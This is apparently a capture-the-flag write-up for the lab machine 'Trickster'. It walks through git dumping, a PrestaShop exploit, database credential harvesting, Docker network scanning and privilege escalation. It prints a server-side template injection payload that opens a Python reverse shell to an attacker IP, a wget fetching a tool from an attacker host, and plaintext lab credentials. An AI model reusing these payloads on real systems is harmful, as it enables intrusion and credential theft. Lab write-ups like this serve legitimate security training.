# Trickster

I discovered some runnings ports `80,8100,22` using nmap and `shop.trickster.htb` using Ffuf. then i fuzzed shop.trickster.htb and discovered an open directory `/.git/ and /robots.txt`

i dumped the github repostery using git\_dumper.

```python
python3 git_dumper.py http://shop.trickster.htb/.git/ ./output-folder
```

After some researchs on the github i found the `/admin634ewutrx1jgitlooaj/index.php` than using.

```sh
grep -ri 'trickster'
```

This command will return some usefull information: username `adam` with email `adam@trickster.htb`

The admin pannel shows us that the website uses `PrestaShop 8.1.5` template.

```r
After some investigation , i found a CVE https://ayoubmokhtar.com/post/png_driven_chain_xss_to_remote_code_execution_prestashop_8.1.5_cve-2024-34716/
```

Download the whole repostiry and run the exploit to get the shell.

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Threw my invistigation i runned:

```sh
grep -ri 'password'
~/prestashop/app/config/parameters.php
```

Here we found Database creds, since theres a mysql server running Lets connect to it.

```sql
mysql -u ps_user -p -h 127.0.0.1 prestashop
prest@shop_o

show tables;
select * from es_employee
```

I found a password hash and a username `james` lets crack it :)

```c
james:alwaysandforever
```

Finally we can ssh and we got the user flag :)

I checked running ports and found nothing interesting so i check for running docker

```check
ps aux | grep docker
```

It appears that **Docker** is running on the machine. The `dockerd` process (the Docker daemon) is running with the following details:

* Process ID (`PID`): 1370
* The command: `/usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock`

### fscan

since we cannot acces it , lets check its ip

```c++
ifconfig
docker0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255

```

since the ip plage is large we gonna scan with an automated tool.

First i installed fscan on host machine .

```sh
wget http://10.10.14.63:8000/fscan/fscan
```

Secondly i did a scan to discover working ip's

```sh
./fscan -h 172.17.0.1/16
```

And finally we scan open ports.

```sh
./fscan -h 172.17.0.2 -p 1-65535
```

I found that port 5000 is running on .2 ip , lets forward the port to our machine :)

```sh
ssh -L 5000:172.17.0.2:5000 james@trickster.htb
```

Visit the website Login with james password: alwaysandforever

edit a watch list , visit notifications and inject this for rce :

```js

<div data-gb-custom-block data-tag="for"> <div data-gb-custom-block data-tag="if" data-0='warning'>  {{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.95\",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'").read()}}  </div> </div>
```

\---The steps i took are mentionned on 2 POC's , u'll find them if google the version and template name.

than search for br files. open a server and upload them on ur machine to decompresses them.

```sh
ssh james@trickster.htb -L 5000:172.17.0.2:5000 -L 123:172.17.0.2:123
alwaysandforever
cd /datastore
python3 -m http.server 123 &
wget -r -np -nH --cut-dirs=1 -R "index.html*" --no-remove-listing -X "index.html*" http://0.0.0.0:123/
brotli -d file
```

I starting greping for commond words that usally expose cred like username, password , user , passwd , data , database ... and found those

```css
adam : adam_admin992
```

Than sudo - l google for any exploit about the file u are able to run follow the steps and boom , u are root :)
